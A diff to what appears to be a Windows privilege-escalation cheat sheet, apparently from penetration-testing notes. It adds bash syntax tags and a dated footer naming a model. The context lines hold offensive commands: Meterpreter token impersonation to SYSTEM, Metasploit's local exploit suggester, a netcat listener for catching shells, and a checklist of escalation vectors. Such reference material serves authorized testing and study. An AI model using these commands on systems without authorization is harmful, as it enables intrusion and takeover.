@@ -233,7 +233,7 @@ Common on service accounts (IIS, MSSQL, Windows services).
 
 **Via Meterpreter — incognito module:**
 
-```
+```bash
 meterpreter > use incognito
 meterpreter > list_tokens -u
 meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
@@ -786,7 +786,7 @@ python wes.py sysinfo.txt -i "Elevation of Privilege" --exploits-only
 
 **Via Metasploit (post-exploitation):**
 
-```
+```bash
 msf6 > use post/multi/recon/local_exploit_suggester
 msf6 > set SESSION <id>
 msf6 > run
@@ -817,7 +817,7 @@ nc -lvnp <PORT>
 
 ## Quick Reference Checklist
 
-```
+```bash
 ENUMERATION
 [ ] whoami /all                          — privs + groups + integrity level
 [ ] systeminfo + wmic qfe                — OS + patches
@@ -871,3 +871,9 @@ OTHER VECTORS
 [ ] Kernel exploits (Watson / WES-NG / local_exploit_suggester)
 [ ] winPEAS for anything missed
 ```
+
+---
+
+*Created: 2026-02-27*
+*Updated: 2026-05-13*
+*Model: claude-sonnet-4-6*
